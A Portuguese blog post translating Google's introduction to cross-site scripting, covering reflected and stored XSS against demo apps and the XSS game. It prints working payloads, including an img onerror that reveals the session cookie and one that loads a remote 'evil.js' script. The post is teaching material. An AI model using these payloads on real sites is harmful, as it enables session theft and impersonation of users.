---
layout: post
title: 'XSS - Cross-site scripting '
date: '2018-05-13T07:20:00.000-07:00'
author: Israel Helton Wernik
tags: 
modified_time: '2018-05-14T12:18:41.237-07:00'
thumbnail: https://4.bp.blogspot.com/-IxeSONiOtFk/Wvng_Puha6I/AAAAAAAAAHs/tlOJcXO5qrcaDvIF3g4lvhR7YqLmbkMQQCLcBGAs/s72-c/Cross-Site-Scripting-The-Security-Hole-To-Your-Website-That-You-Should-TakeCare-Of.jpg
blogger_id: tag:blogger.com,1999:blog-5213248075369348047.post-6755805414122533700
blogger_orig_url: https://cibersegurancawernik.blogspot.com/2018/05/xss-cross-site-scripting.html
---

<div style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><span style="font-weight: normal;">Eu traduzi esse artigo do google e acrescentei alguns outros detalhes.&nbsp;</span></div><div style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; white-space: pre-wrap;">Veja o original aqui </span></div><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://www.google.com/about/appsecurity/learning/xss/index.html" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">https://www.google.com/about/appsecurity/learning/xss/index.html</span></a></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Após ler esse artigo vale a pena jogar o jogo do google sobre XXS</span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://xss-game.appspot.com/" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">https://xss-game.appspot.com/</span></a></div><div style="font-size: medium; font-weight: 400;"><span id="docs-internal-guid-6dc8c26d-59dd-5f29-048c-660e87b80c8c"><br /></span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"></span></div></h1><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><span style="font-family: &quot;arial&quot;; font-size: 20pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Introdução ao cross-site scripting</span></h1><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: &quot;arial&quot;; font-size: 16pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Público-alvo</span></h2><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Este documento destina-se a qualquer pessoa que desenvolva websites ou tenha interesse em tópicos de segurança da Web. Um plano de fundo em HTML, JavaScript e Document Object Model (DOM) seria útil para alguns dos detalhes mais técnicos. </span><br /><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br /></span></div><div style="font-size: medium; font-weight: 400;"><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-IxeSONiOtFk/Wvng_Puha6I/AAAAAAAAAHs/tlOJcXO5qrcaDvIF3g4lvhR7YqLmbkMQQCLcBGAs/s1600/Cross-Site-Scripting-The-Security-Hole-To-Your-Website-That-You-Should-TakeCare-Of.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="975" data-original-width="1600" height="195" src="https://4.bp.blogspot.com/-IxeSONiOtFk/Wvng_Puha6I/AAAAAAAAAHs/tlOJcXO5qrcaDvIF3g4lvhR7YqLmbkMQQCLcBGAs/s320/Cross-Site-Scripting-The-Security-Hole-To-Your-Website-That-You-Should-TakeCare-Of.jpg" width="320" /></a></div><br /><a name='more'></a><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">Não seja mau Don't be evil</span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Este documento fornece informações que podem ser usadas para avaliar a segurança de um site contra vulnerabilidades de script entre sites. Não use o que você aprende aqui para testar (ou pior, atacar) sites sem a permissão do proprietário do site. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">O que é cross-site scripting e por que devo me importar? </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Cross-site scripting (XSS) é um bug de segurança que pode afetar sites. Se presente em seu site, esse bug pode permitir que um invasor adicione seu próprio código JavaScript malicioso às páginas HTML exibidas para seus usuários. Uma vez executado pelo navegador da vítima, esse código pode executar ações como alterar completamente o comportamento ou a aparência do site, roubar dados particulares ou executar ações em nome do usuário.</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Não se preocupe, mostraremos o que isso significa, mas antes de aprofundarmos, vamos dar uma olhada em alguns exemplos interativos para ver como funciona. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">Um exemplo básico</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">XSS Refletido:</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">As vulnerabilidades de XSS ocorrem com mais frequência quando a entrada do usuário é incorporada na resposta de um servidor da Web (ou seja, uma página HTML) sem escape ou validação adequados. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Considere o aplicativo de pesquisa abaixo. Clique em " Show demo" para carregar o aplicativo. Este é um aplicativo de demonstração de trabalho; Então, você pode interagir com ele - tente procurar por algo.Para sua referência, também incluímos o código-fonte do App Engine. Você pode visualizar o código clicando no link " Clique para visualizar o código-fonte do aplicativo "</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">No google chrome está com um problema no level 3</span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://xss-game.appspot.com/" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">https://xss-game.appspot.com/</span></a></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Clique para ver o código fonte do aplicativo Usando o aplicativo de demonstração acima, pesquise por test . . Isso retorna a seguinte saída: Desculpe, não foram encontrados resultados para teste . </span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="193" src="https://lh5.googleusercontent.com/j5sls2FnC0ONYLM75hIayrqFgyF6KlLE7b2pf2cWeegjhhJpe-kK4jkloIFY2GI5Q5P_YLH1AvwY7i2TmofB4lEG2OeVEvZxf2huUW0tw4u9J_UApqfm1rQqaWKq90gVaNNGz5rK" style="border: none; transform: rotate(0rad);" width="602" /></span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Sorry, no results were found for test. Try again.</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Agora, procure por</span><span style="background-color: #f8f8f8; color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> &lt;u&gt;</span><span style="background-color: #f8f8f8; color: #0086b3; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">test</span><span style="background-color: #f8f8f8; color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&lt;/u&gt;</span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> . Observe que "teste" está sublinhado na resposta: Desculpe, não foram encontrados resultados para teste . Sorry, no results were found for test . Try again.</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="97" src="https://lh6.googleusercontent.com/6hpoa2s8e5Zq2dYVO2qfnMgjba1T6EDcHcvvqvnb3Fei_LG-3uj6BI_MmvEj4wftDR7LT7-PxQVRoQjU2G4-68yfmHenm1di_X7XB3YIrjsnOQoYKLhxsnwsbakODy8QDLYarais" style="border: none; transform: rotate(0rad);" width="602" /></span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Portanto, sem olhar para o código, parece que o aplicativo inclui nossa própria marcação HTML na resposta. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Isso é interessante, mas não terrivelmente perigoso. Se, no entanto, o aplicativo também nos permite injetar código JavaScript, isso seria muito mais "interessante". </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Vamos tentar. Procure por </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #f8f8f8; padding: 5pt; vertical-align: top;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&lt;script&gt;</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">alert(</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">'hello'</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">)</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&lt;/script&gt;</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> . </span></div></td></tr></tbody></table></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Encontramos um erro XSS!</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Você acabou de experimentar um ataque XSS "refletido", em que a payload do JavaScript ( &lt;script&gt;alert('hello')&lt;/script&gt; ) é ecoada de volta na página retornada pelo servidor. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Se você observar a linha 50 do código-fonte, verá que a mensagem exibida na página de resultados da pesquisa é uma cadeia construída usando o valor de entrada da query.</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Essa sequência é passada para uma função que renderiza a saída HTML usando o método response.out.write na linha 37. O problema é que a entrada não é escapada antes de ser renderizada. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Discutiremos o escape mais tarde na seção "Prevenindo XSS". </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">No cenário acima, um invasor precisaria da vítima para:</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><ul style="font-size: medium; font-weight: 400; margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Visite qualquer página controlada pelo invasor. Essa página pode incluir um iframe invisível que aponta para o site vulnerável ao XSS, juntamente com uma payload útil para explorar a vulnerabilidade. </span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Ou clique em um link de URL do invasor. Este link incluiria a payload útil da exploração (no exemplo acima, https://xss-doc.appspot.com/demo/2?query= &lt;script&gt; alert ('olá') &lt;/ script&gt; ) e pode até mesmo ser obscurecida por um encurtador de URL. </span></div></li></ul><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Vale a pena notar que o payload do XSS pode ser entregue de diferentes maneiras; </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">por exemplo, pode estar em um parâmetro de uma solicitação HTTP POST, como parte da URL, ou até mesmo dentro do cookie do navegador da Web - basicamente, em qualquer lugar em que um usuário possa fornecer informações para o site. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Tudo isso para gerar uma janela pop-up irritante pode não valer a pena. </span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Infelizmente, as vulnerabilidades do XSS podem resultar em muito mais do que alertas em uma página (um alerta pop-up é apenas uma maneira conveniente para um invasor ou pesquisador detectar a presença de um bug XSS). </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Dê uma olhada no próximo exemplo de um script mais malicioso. </span></div></h1><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: &quot;arial&quot;; font-size: 16pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Às vezes, a payload útil do XSS pode persistir &nbsp;- </span><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">stored XSS</span></h2><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">No ataque que descrevemos acima, o servidor da web ecoa de volta a payload do XSS para a vítima imediatamente.</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Mas também é possível que o servidor armazene a entrada fornecida pelo invasor (a payload do XSS) e a entregue à vítima em um momento posterior. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Isso é chamado de "XSS armazenado".</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">No level 2 há um exemplo básico usando um site de rede social de demonstração. </span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://xss-game.appspot.com/level2" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">https://xss-game.appspot.com/level2</span></a></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Vá em frente, insira algum texto e compartilhe seu status no aplicativo de demonstração abaixo. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Clique para ver o código fonte do aplicativo </span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Em seguida, tente isto:</span></div><ol style="font-size: medium; font-weight: 400; margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Digite </span><span style="background-color: #f8f8f8; color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&lt;img </span><span style="background-color: #f8f8f8; color: teal; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">src</span><span style="background-color: #f8f8f8; color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: #f8f8f8; color: #dd1144; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">x</span><span style="background-color: #f8f8f8; color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #f8f8f8; color: teal; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">onerror</span><span style="background-color: #f8f8f8; color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: #f8f8f8; color: #dd1144; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">"alert('Pop-up window via stored XSS');"</span><span style="background-color: #f8f8f8; color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> </span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Compartilhe seu status. </span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Você deve ver um alerta de pop-up! Você verá o alerta novamente se atualizar a página ou compartilhar outra mensagem de status. </span></div></li></ol><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Agora, digite </span><span style="background-color: #f8f8f8; color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&lt;img </span><span style="background-color: #f8f8f8; color: teal; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">src</span><span style="background-color: #f8f8f8; color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: #f8f8f8; color: #dd1144; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">x</span><span style="background-color: #f8f8f8; color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #f8f8f8; color: teal; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">onerror</span><span style="background-color: #f8f8f8; color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: #f8f8f8; color: #dd1144; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">"alert(document.cookie);"</span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> e clique em ' Share status! </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O ID da sessão para este aplicativo (um inventivo que provavelmente é ' 123412341234 ') irá aparecer! </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Um invasor pode usar o código de exploração XSS para coletar esse ID de sessão e tentar representar o proprietário da conta.</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Nota: Para redefinir o aplicativo e se livrar dos irritantes pop-ups, clique no botão " Limpar todos os posts ". </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O que mais você pode fazer além de exibir alertas ou roubar identificações de sessão? </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Você pode fazer praticamente qualquer coisa que o JavaScript permitir. &nbsp;Tente digitar o seguinte: Try entering the following:</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #f8f8f8; padding: 5pt; vertical-align: top;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&lt;img </span><span style="color: teal; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">src</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">1</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: teal; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">onerror</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">"s=document.createElement('script');s.src='//xss-doc.appspot.com/static/evil.js';document.body.appendChild(s);"</span></div></td></tr></tbody></table></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Assustador, hein? Neste exemplo, um arquivo JavaScript malvado foi recuperado e incorporado via XSS. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div 